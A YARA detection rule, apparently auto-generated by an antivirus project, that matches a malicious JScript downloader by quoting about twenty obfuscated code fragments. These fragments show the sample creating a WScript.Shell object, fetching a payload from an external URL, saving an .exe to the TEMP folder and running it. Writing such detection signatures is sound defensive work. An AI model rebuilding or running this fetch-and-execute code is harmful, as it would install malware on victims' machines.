rule sig_20160401_fed948e419f09207f624e4ba71c9ce98 {
  meta:
    description = "datamaliciousorder - file 20160401_fed948e419f09207f624e4ba71c9ce98.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ce815a7da6430cd69152eed78223795dcbece8a77bb7c6f354fc7e0712974fc0"

  strings:
    $s1  = "var PxbTka = function ItQsg() {return WScript[NbqLxf](\"WScript\"+\".Shell\");}(), GfjQyk = 11;" fullword ascii
    $s2  = "function YmFve(OxmKr, AjgZs){DlPdv = DlPdv * 1; return OxmKr - AjgZs;};" fullword ascii
    $s3  = "if (FjmUvz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "FjmUvz[NxBwl](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s5  = "function PxStq(){return BnZf + \"\";};" fullword ascii
    $s6  = "function FfaVkn() {return PxbTka[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HAEAlPZT.ex\" + \"e\";};" fullword ascii
    $s7  = "function WjSjv() {return ((NxpVe == true) && (NxpVe == XlgOcj)) ? 1 : DlPdv;};" fullword ascii
    $s8  = "function RbqAn(){return 23;};" fullword ascii
    $s9  = "function ReeTl(){return NbqLxf;};" fullword ascii
    $s10 = "var HuMim = new this[\"Date\"]();" fullword ascii
    $s11 = "function UpQo(CnPc) {var KyZwb = (1, 2, 3, 4, 5, CnPc); return KyZwb;};" fullword ascii
    $s12 = "var XlgOcj = false;" fullword ascii
    $s13 = "function ErfCq()" fullword ascii
    $s14 = "var NxpVe = false;" fullword ascii
    $s15 = "function AlzDy(DwIs){PxbTka[\"R\"+\"un\"](DwIs, DlPdv, DlPdv);};" fullword ascii
    $s16 = "var UlYf = false;" fullword ascii
    $s17 = "NxpVe = true; " fullword ascii
    $s18 = "return YmFve(RaXm, QnwEs);" fullword ascii
    $s19 = "}while (CuyYk);" fullword ascii
    $s20 = "XlgOcj = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}